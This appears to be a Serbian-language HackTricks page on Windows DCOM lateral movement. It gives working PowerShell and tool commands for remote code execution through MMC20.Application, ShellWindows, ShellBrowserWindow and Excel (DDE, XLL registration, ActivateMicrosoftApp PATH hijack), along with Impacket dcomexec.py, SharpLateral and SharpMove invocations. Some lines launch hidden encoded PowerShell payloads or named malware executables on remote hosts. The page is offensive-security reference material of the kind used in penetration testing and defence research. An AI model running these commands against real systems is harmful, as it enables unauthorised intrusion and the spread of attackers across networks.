# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

DCOM lateral movement je privlačan zato što ponovo koristi postojeće COM servere izložene preko RPC/DCOM-a, umesto kreiranja servisa ili scheduled task-a. U praksi to znači da početna konekcija obično počinje na TCP/135, a zatim prelazi na dinamički dodeljene visoke RPC portove.

## Preduslovi i važne napomene

- Obično vam je potreban kontekst lokalnog administratora na targetu, a udaljeni COM server mora dozvoljavati remote launch/activation.
- Od **14. marta 2023.** Microsoft primenjuje DCOM hardening na podržanim sistemima. Stari klijenti koji zahtevaju nizak nivo authentication-a za activation mogu da zakažu, osim ako ne pregovaraju najmanje `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY`. Moderni Windows klijenti se obično automatski podižu na odgovarajući nivo, tako da aktuelni alati uglavnom i dalje rade.<sup>[[3]](#references)</sup>
- Ručno ili skriptovano DCOM izvršavanje uglavnom zahteva TCP/135 i target-ov opseg dinamičkih RPC portova. Ako koristite Impacket-ov `dcomexec.py` i želite da dobijete output komande, obično vam je potreban i SMB pristup ka `ADMIN$` (ili nekom drugom share-u sa dozvolama za čitanje/upis).
- Ako RPC/DCOM radi, ali je SMB blokiran, `dcomexec.py -nooutput` i dalje može biti koristan za blind execution.

Brze provere:
```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```
## MMC20.Application

**Za više informacija o ovoj tehnici pogledajte originalnu objavu na adresi [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**<sup>[[1]](#references)</sup>

Distributed Component Object Model (DCOM) objekti pružaju zanimljivu mogućnost za interakcije sa objektima zasnovane na mreži. Microsoft pruža sveobuhvatnu dokumentaciju za DCOM i Component Object Model (COM), dostupnu [ovde za DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) i [ovde za COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>). Lista DCOM aplikacija može se dobiti pomoću PowerShell komande:
```bash
Get-CimInstance Win32_DCOMApplication
```
COM objekat, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), omogućava skriptovanje operacija MMC snap-in-a. Važno je napomenuti da ovaj objekat sadrži metodu `ExecuteShellCommand` u okviru `Document.ActiveView`. Više informacija o ovoj metodi možete pronaći [ovde](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>). Proverite pokretanjem:<sup>[[6]](#references)</sup>

Ova funkcija omogućava izvršavanje komandi preko mreže putem DCOM aplikacije. Za udaljenu interakciju sa DCOM-om kao administrator, PowerShell se može koristiti na sledeći način:
```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Ova komanda se povezuje sa DCOM aplikacijom i vraća instancu COM objekta. Zatim se može pozvati metoda ExecuteShellCommand da bi se izvršio proces na udaljenom hostu. Proces obuhvata sledeće korake:

Provera metoda:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
Dobijanje RCE-a:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
"cmd.exe",
$null,
"/c powershell -NoP -W Hidden -Enc <B64>",
"7"
)
```
Poslednji argument predstavlja stil prozora. `7` zadržava prozor minimizovanim. U operativnom smislu, izvršavanje zasnovano na MMC-u obično dovodi do toga da udaljeni proces `mmc.exe` pokrene vaš payload, što se razlikuje od objekata zasnovanih na Explorer-u navedenih u nastavku.

## ShellWindows & ShellBrowserWindow

**Za više informacija o ovoj tehnici pogledajte originalnu objavu [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**<sup>[[2]](#references)</sup>

Utvrđeno je da objektu **MMC20.Application** nedostaju eksplicitne „LaunchPermissions“ dozvole, pa se podrazumevano koriste dozvole koje Administratorima omogućavaju pristup. Za dodatne detalje možete pogledati [ovu diskusiju](https://twitter.com/tiraniddo/status/817532039771525120), a preporučuje se korišćenje alata OleView .NET autora [@tiraniddo](https://twitter.com/tiraniddo) za filtriranje objekata bez eksplicitne Launch Permission dozvole.

Dva specifična objekta, `ShellBrowserWindow` i `ShellWindows`, izdvojena su zbog nedostatka eksplicitnih Launch Permissions dozvola. Odsustvo `LaunchPermission` registry unosa pod `HKCR:\AppID\{guid}` označava da ne postoje eksplicitne dozvole.

U poređenju sa objektom `MMC20.Application`, ovi objekti su često tiši iz OPSEC perspektive, jer komanda na udaljenom hostu obično završi kao child proces `explorer.exe`, umesto kao child proces `mmc.exe`.

### ShellWindows

Za `ShellWindows`, koji nema ProgID, .NET metode `Type.GetTypeFromCLSID` i `Activator.CreateInstance` omogućavaju instanciranje objekta korišćenjem njegovog AppID-a. Ovaj proces koristi OleView .NET za pronalaženje CLSID-a objekta `ShellWindows`. Nakon instanciranja, moguća je interakcija putem metode `WindowsShell.Item`, što dovodi do pozivanja metode kao što je `Document.Application.ShellExecute`.

Navedene su sledeće PowerShell komande za instanciranje objekta i daljinsko izvršavanje komandi:
```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### ShellBrowserWindow

`ShellBrowserWindow` je sličan, ali ga možete direktno instancirati putem njegovog CLSID-a i pivotovati ka `Document.Application.ShellExecute`:
```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
"cmd.exe",
"/c whoami > C:\\Windows\\Temp\\dcom.txt",
"C:\\Windows\\System32",
$null,
0
)
```
### Lateral Movement sa Excel DCOM Objects

Lateral movement se može postići iskorišćavanjem DCOM Excel objekata. Za detaljnije informacije preporučuje se da pročitate diskusiju o korišćenju Excel DDE za lateral movement putem DCOM-a na [Cybereason's blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).<sup>[[5]](#references)</sup>

Empire projekat obezbeđuje PowerShell skriptu koja demonstrira korišćenje Excela za remote code execution (RCE) manipulisanjem DCOM objektima. U nastavku se nalaze isečci iz skripte dostupne u [Empire's GitHub repository](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), koji prikazuju različite metode za abuse Excela radi RCE-a:
```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
Nedavna istraživanja proširila su ovu oblast metodom `Excel.Application` objekta `ActivateMicrosoftApp()`. Ključna ideja je da Excel može pokušati da pokrene zastarele Microsoft aplikacije, kao što su FoxPro, Schedule Plus ili Project, tako što ih traži u sistemskom `PATH`-u. Ako operator može da postavi payload sa jednim od očekivanih naziva na lokaciju sa dozvolom za upis koja je deo ciljnog `PATH`-a, Excel će ga izvršiti.<sup>[[4]](#references)</sup>

Zahtevi za ovu varijaciju:

- Lokalni administrator na cilju
- Excel instaliran na cilju
- Mogućnost upisivanja payload-a u direktorijum sa dozvolom za upis koji se nalazi u ciljnom `PATH`-u

Praktičan primer iskorišćavanja FoxPro pretrage (`FOXPROW.exe`):
```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```
Ako napadački host nema registrovan lokalni `Excel.Application` ProgID, instancirajte udaljeni objekat umesto toga pomoću CLSID-a:
```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```
Vrednosti za koje je u praksi uočena zloupotreba:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### Alati za automatizaciju za Lateral Movement

Dva alata su izdvojena za automatizaciju ovih tehnika:

- **Invoke-DCOM.ps1**: PowerShell skripta koju obezbeđuje Empire projekat i koja pojednostavljuje pozivanje različitih metoda za izvršavanje koda na udaljenim računarima. Ova skripta je dostupna u Empire GitHub repozitorijumu.

- **SharpLateral**: Alat namenjen za daljinsko izvršavanje koda, koji se može koristiti sledećom komandom:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Automatski alati

- Powershell skripta [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) omogućava jednostavno pozivanje svih načina za izvršavanje koda na drugim mašinama navedenih u komentarima.
- Možete koristiti Impacket-ov `dcomexec.py` za izvršavanje komandi na udaljenim sistemima pomoću DCOM-a. Trenutne verzije podržavaju `ShellWindows`, `ShellBrowserWindow` i `MMC20`, a podrazumevana vrednost je `ShellWindows`.
```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```
- Takođe možete koristiti [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- Takođe možete koristiti [**SharpMove**](https://github.com/0xthirteen/SharpMove)
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Reference

- [1] [Lateral Movement using the MMC20.Application COM Object](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [2] [Lateral Movement via DCOM: Round 2](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [3] [KB5004442—Upravljanje promenama za Windows DCOM Server Security Feature Bypass (CVE-2021-26414)](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [4] [Lateral Movement: Iskorišćavanje mogućnosti DCOM Excel Application](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
- [5] [Iskorišćavanje Excel DDE za lateral movement putem DCOM-a](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
- [6] [technet.microsoft.com - MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)

{{#include ../../banners/hacktricks-training.md}}
